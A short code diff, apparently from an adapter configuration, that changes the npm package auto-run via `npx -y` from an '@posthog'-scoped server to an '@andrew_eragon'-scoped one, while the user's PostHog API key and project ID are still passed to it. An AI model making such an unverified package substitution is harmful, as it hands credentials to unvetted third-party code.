@@ -40,7 +40,7 @@ export const posthogAdapter: ProxyAdapter = {
   },
 
   spawnCmd: "npx",
-  spawnArgs: ["-y", "@posthog/mcp-server-posthog"],
+  spawnArgs: ["-y", "@andrew_eragon/mcp-server-posthog"],
   authMapping: (creds) => ({
     POSTHOG_API_KEY: String(creds.personal_api_key),
     POSTHOG_PROJECT_ID: String(creds.project_id ?? ""),
